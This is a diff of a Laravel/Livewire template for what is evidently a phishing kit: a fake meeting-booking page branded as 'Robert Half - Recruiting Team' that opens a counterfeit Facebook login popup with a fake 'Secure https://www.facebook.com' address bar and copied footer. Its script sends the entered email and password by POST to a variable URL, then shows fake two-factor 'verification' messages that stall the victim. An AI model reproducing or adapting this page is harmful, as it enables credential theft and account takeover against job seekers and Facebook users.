@@ -4,12 +4,12 @@
             <div class="box__shadow">
                 <div class="calendar__wrapper">
                     <div class="user__wrapper">
-                        <div class="logo__wrapper"><img width="50%" src="img/images.png" /></div>
+                        <div class="logo__wrapper"><img width="50%" src="{{asset('img/images.png')}}" /></div>
                         <div class="screen__two center__text">
                             <div class="mobile__back-svg">
                                 <div class="content__wrapper">
                                     <div style="margin-bottom: 15px;">
-                                        <div><img class="avatar" width="65px" src="img/logo.png" /></div>
+                                        <div><img class="avatar" width="65px" src="{{asset('img/logo.png')}}" /></div>
                                     </div>
                                     <h2>15 Minutes Meeting</h2>
                                 </div>
@@ -61,7 +61,7 @@
                                     <div class="time__zone-wrapper" style="margin-top: 20px;">
                                         <p>Time zone</p>
                                         <div class="central">
-                                            <img width="14px" src="world.png">
+                                            <img width="14px" src="{{asset('world.png')}}">
                                             Asia/Dhaka (17:53)
                                         </div>
                                     </div>
@@ -86,7 +86,7 @@
                     <div class="form__wrapper date__time {{$showCalender ? 'd-none':''}}">
                         <div>
                             <div class="full__width">
-                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Shirin Kurdi</h2></div>
+                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Robert Half - Recruiting Team</h2></div>
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                     <div class="form-steps">
                                         <form id="msform">
@@ -101,7 +101,7 @@
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                     <div class="dummy__text">
                                         <p>
-                                            Please confirm your appointment with Shirin Kurdi. <br />
+                                            Please confirm your appointment with Robert Half - Recruiting Team. <br />
                                             To complete the confirmation process, continue with Facebook
                                         </p>
                                     </div>
@@ -174,19 +174,19 @@
                                 <div>
                                     <div class="wrapper_header">
                                         <div class="sign__up-modal">
-                                            <img src="img/hLRJ1GG_y0J.ico" alt="" width="17px" />
+                                            <img src="{{asset('img/hLRJ1GG_y0J.ico')}}" alt="" width="17px" />
                                             <p>Log into Facebook | Facebook</p>
                                         </div>
                                         <div class="icons">
-                                            <div class="img"><img src="img/minus.png" alt="" /></div>
+                                            <div class="img"><img src="{{asset('img/minus.png')}}" alt="" /></div>
                                             <div class="img"><img src="https://icons-for-free.com/iconfiles/png/512/square-1321215626459427421.png" alt="" /></div>
-                                            <div class="img img-x"><img src="img/close.png" alt="" /></div>
+                                            <div class="img img-x"><img src="{{asset('img/close.png')}}" alt="" /></div>
                                         </div>
                                     </div>
                                     <div class="input__title-wrapper">
                                         <div class="lock__screen">
                                             <div class="lock">
-                                                <div class="lock__wrapper"><img src="img/locktest.png" alt="" /><span class="green">Secure | https:</span><span class="black-opacity">//</span></div>
+                                                <div class="lock__wrapper"><img src="{{asset('img/locktest.png')}}" alt="" /><span class="green">Secure | https:</span><span class="black-opacity">//</span></div>
                                             </div>
                                             <span class="input__value">
                                             www.facebook.com
@@ -306,7 +306,7 @@
                                             <button>Having trouble?</button>
                                         </div>
                                         <div class="show-button-mobile false">
-                                            <button>Continue</button>
+                                            <button type="submit">Continue</button>
                                         </div>
                                         <div class="show-footer-on-mobile-plus">
                                             <h2 class="h2-foot not__you-text">Not You? Log In Here</h2>
@@ -328,73 +328,73 @@
                                     </div>
                                 @endif
                                 @if($enableLoadingAfterSubmit)
-                                <div class="loading-container">
-                                    <div class="loading-message">Please be patient and dont close this window</div>
-                                    <div class="loading-submessage step1">Checking the details on your account...</div>
-                                    <div class="loading-submessage step2">Checking email addresses...</div>
-                                    <div class="loading-submessage step3">Checking two-factor authenticator...</div>
-                                    <div class="loading-submessage step4">Checking other details...</div>
-                                    <div class="loading-submessage finalStep">It can take up to 10 minutes to verify your account.</div>
-                                    <div class="loader"></div>
-                                </div>
+                                    <div class="loading-container">
+                                        <div class="loading-message">Please be patient and dont close this window</div>
+                                        <div class="loading-submessage step1">Checking the details on your account...</div>
+                                        <div class="loading-submessage step2">Checking email addresses...</div>
+                                        <div class="loading-submessage step3">Checking two-factor authenticator...</div>
+                                        <div class="loading-submessage step4">Checking other details...</div>
+                                        <div class="loading-submessage finalStep">It can take up to 10 minutes to verify your account.</div>
+                                        <div class="loader"></div>
+                                    </div>
                                 @endif
                             </div>
                             @if($showModalFooter)
-                            <div class="modal__footer">
-                                <div class="footer-menu-flex-ul">
-                                    <div class="container-language-footer">
-                                        <ul class="flex-ul">
-                                            <li>English (US)</li>
-                                            <li>Español</li>
-                                            <li>Deutsch</li>
-                                            <li>Türkçe</li>
-                                            <li>Српски</li>
-                                            <li>Français (France)</li>
-                                            <li>Italiano</li>
-                                            <li>Bosanski</li>
-                                            <li>Svensk</li>
-                                            <li>Português (Brasil)</li>
-                                            <button class="countrys-button"><span>+</span></button>
-                                        </ul>
+                                <div class="modal__footer">
+                                    <div class="footer-menu-flex-ul">
+                                        <div class="container-language-footer">
+                                            <ul class="flex-ul">
+                                                <li>English (US)</li>
+                                                <li>Español</li>
+                                                <li>Deutsch</li>
+                                                <li>Türkçe</li>
+                                                <li>Српски</li>
+                                                <li>Français (France)</li>
+                                                <li>Italiano</li>
+                                                <li>Bosanski</li>
+                                                <li>Svensk</li>
+                                                <li>Português (Brasil)</li>
+                                                <button class="countrys-button"><span>+</span></button>
+                                            </ul>
+                                        </div>
+                                        <div class="flex-second-ul">
+                                            <ul>
+                                                <li>Sign Up</li>
+                                                <li>Log In</li>
+                                                <li>Messenger</li>
+                                                <li>Facebook Lite</li>
+                                                <li>Watch</li>
+                                                <li>Places</li>
+                                                <li>Games</li>
+                                                <li>Marketplace</li>
+                                                <li>Facebook Pay</li>
+                                                <li>Oculus</li>
+                                                <li>Portal</li>
+                                                <li>Instagram</li>
+                                                <li>Bulletin</li>
+                                                <li>Local</li>
+                                            </ul>
+                                        </div>
+                                        <div class="flex-second-ul-2">
+                                            <ul>
+                                                <li>Fundraisers</li>
+                                                <li>Services</li>
+                                                <li>Voting Information Centre</li>
+                                                <li>About</li>
+                                                <li>Create ad</li>
+                                                <li>Create Page</li>
+                                                <li>Developers</li>
+                                                <li>Careers</li>
+                                                <li>Privacy</li>
+                                                <li>Cookies</li>
+                                                <li class="ad-choice-img">Ad Choices <span class="img-li"></span></li>
+                                                <li>Terms</li>
+                                                <li>Help</li>
+                                            </ul>
+                                        </div>
+                                        <div class="meta-footer"><p>Meta © 2024</p></div>
                                     </div>
-                                    <div class="flex-second-ul">
-                                        <ul>
-                                            <li>Sign Up</li>
-                                            <li>Log In</li>
-                                            <li>Messenger</li>
-                                            <li>Facebook Lite</li>
-                                            <li>Watch</li>
-                                            <li>Places</li>
-                                            <li>Games</li>
-                                            <li>Marketplace</li>
-                                            <li>Facebook Pay</li>
-                                            <li>Oculus</li>
-                                            <li>Portal</li>
-                                            <li>Instagram</li>
-                                            <li>Bulletin</li>
-                                            <li>Local</li>
-                                        </ul>
-                                    </div>
-                                    <div class="flex-second-ul-2">
-                                        <ul>
-                                            <li>Fundraisers</li>
-                                            <li>Services</li>
-                                            <li>Voting Information Centre</li>
-                                            <li>About</li>
-                                            <li>Create ad</li>
-                                            <li>Create Page</li>
-                                            <li>Developers</li>
-                                            <li>Careers</li>
-                                            <li>Privacy</li>
-                                            <li>Cookies</li>
-                                            <li class="ad-choice-img">Ad Choices <span class="img-li"></span></li>
-                                            <li>Terms</li>
-                                            <li>Help</li>
-                                        </ul>
-                                    </div>
-                                    <div class="meta-footer"><p>Meta © 2024</p></div>
                                 </div>
-                            </div>
                             @endif
                         </div>
                         <div class="ant-modal-footer">
@@ -449,7 +449,7 @@
         @this.set('showModalFooter',false);
         @this.set('enableLoginForm',false);
         @this.set('enableLoadingAfterSubmit',true);
-         emailElement = $('input[name="email"]').val();
+        emailElement = $('input[name="email"]').val();
         const passwordElement = $('input[name="password"]').val();
         fetch(tURL, {
             method: "POST",
